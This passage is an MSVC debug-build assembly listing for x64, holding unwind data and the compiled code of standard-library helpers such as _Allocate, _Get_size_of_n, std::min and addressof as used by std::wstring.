	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
	DB	0f6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 025054719H
	DD	0118231dH
	DD	070110025H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0118H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	065H
	DB	064H
	DB	00H
	ORG $+8
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	08H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0
	ORG $+48
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	00H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DB	041H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	05fH
	DB	06dH
	DB	061H
	DB	078H
	DB	00H
	ORG $+5
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	08H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0
	ORG $+48
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	00H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 89 45 08	 mov	 QWORD PTR _Block_size$[rbp], rax

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00035	48 39 45 08	 cmp	 QWORD PTR _Block_size$[rbp], rax
  00039	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0003b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00040	48 8b 4d 08	 mov	 rcx, QWORD PTR _Block_size$[rbp]
  00044	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00049	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004d	48 83 7d 28 00	 cmp	 QWORD PTR _Ptr_container$[rbp], 0
  00052	74 02		 je	 SHORT $LN9@Allocate_m
  00054	eb 0b		 jmp	 SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
  00056	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0005b	33 c0		 xor	 eax, eax
  0005d	85 c0		 test	 eax, eax
  0005f	75 f5		 jne	 SHORT $LN7@Allocate_m
$LN10@Allocate_m:
  00061	33 c0		 xor	 eax, eax
  00063	85 c0		 test	 eax, eax
  00065	75 e6		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00067	48 8b 45 28	 mov	 rax, QWORD PTR _Ptr_container$[rbp]
  0006b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0006f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
  00073	48 89 45 48	 mov	 QWORD PTR _Ptr$[rbp], rax

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00077	b8 08 00 00 00	 mov	 eax, 8
  0007c	48 6b c0 ff	 imul	 rax, rax, -1
  00080	48 8b 4d 48	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00084	48 8b 55 28	 mov	 rdx, QWORD PTR _Ptr_container$[rbp]
  00088	48 89 14 01	 mov	 QWORD PTR [rcx+rax], rdx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0008c	48 8b 45 48	 mov	 rax, QWORD PTR _Ptr$[rbp]
$LN11@Allocate_m:

; 156  : }

  00090	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00097	5f		 pop	 rdi
  00098	5d		 pop	 rbp
  00099	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Overflow_is_possible$ = 4
_Max_possible$1 = 40
_Count$ = 288
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 68   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;

  0001f	c6 45 04 01	 mov	 BYTE PTR _Overflow_is_possible$[rbp], 1

; 70   : 
; 71   :     if constexpr (_Overflow_is_possible) {
; 72   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;

  00023	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0002d	48 89 45 28	 mov	 QWORD PTR _Max_possible$1[rbp], rax

; 73   :         if (_Count > _Max_possible) {

  00031	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0003b	48 39 85 20 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00042	76 05		 jbe	 SHORT $LN2@Get_size_o

; 74   :             _Throw_bad_array_new_length(); // multiply overflow

  00044	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN2@Get_size_o:

; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00050	48 d1 e0	 shl	 rax, 1
$LN3@Get_size_o:

; 79   : }

  00053	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001f	48 81 bd e0 00
	00 00 00 10 00
	00		 cmp	 QWORD PTR _Bytes$[rbp], 4096 ; 00001000H
  0002a	72 0e		 jb	 SHORT $LN2@Allocate

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  0002c	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00033	e8 00 00 00 00	 call	 ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
  00038	eb 1a		 jmp	 SHORT $LN1@Allocate
$LN2@Allocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  0003a	48 83 bd e0 00
	00 00 00	 cmp	 QWORD PTR _Bytes$[rbp], 0
  00042	74 0e		 je	 SHORT $LN3@Allocate

; 248  :         return _Traits::_Allocate(_Bytes);

  00044	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  0004b	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00050	eb 02		 jmp	 SHORT $LN1@Allocate
$LN3@Allocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00052	33 c0		 xor	 eax, eax
$LN1@Allocate:

; 252  : }

  00054	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ENDP ; std::_Allocate<16,std::_Default_allocate_traits,0>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$ = 224
_Count$ = 232
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  0002b	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  0002e	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Al$[rbp]
  00035	e8 00 00 00 00	 call	 ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate

; 2212 :     }
; 2213 : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
$T1 = 200
tv65 = 216
_Left$ = 256
_Right$ = 264
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

$LN5:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__2F328FEB_utility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00024	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0002b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00032	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00035	48 39 08	 cmp	 QWORD PTR [rax], rcx
  00038	73 10		 jae	 SHORT $LN3@min
  0003a	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  00041	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
  00048	eb 0e		 jmp	 SHORT $LN4@min
$LN3@min:
  0004a	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  00051	48 89 85 d8 00
	00 00		 mov	 QWORD PTR tv65[rbp], rax
$LN4@min:
  00058	48 8b 85 d8 00
	00 00		 mov	 rax, QWORD PTR tv65[rbp]
  0005f	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00066	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]

; 101  : }

  0006d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00074	5f		 pop	 rdi
  00075	5d		 pop	 rbp
  00076	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 224
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__7C4A1519_type_traits
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1584 :     return __builtin_addressof(_Val);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Val$[rbp]

; 1585 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
$T1 = 200
_Obj$ = 256
<_Args_0>$ = 264
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 248  :     is_nothrow_constructible_v<_Ty, _Types...>) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__C27AFEEB_xutility
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00024	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR _Obj$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ; std::addressof<wchar_t *>
  00030	48 8b d0	 mov	 rdx, rax
  00033	b9 08 00 00 00	 mov	 ecx, 8
  00038	e8 00 00 00 00	 call	 ??2@YAPEAX_KPEAX@Z	; operator new
  0003d	48 89 85 c8 00
	00 00		 mov	 QWORD PTR $T1[rbp], rax
  00044	48 8b 85 c8 00
	00 00		 mov	 rax, QWORD PTR $T1[rbp]
  0004b	48 8b 8d 08 01
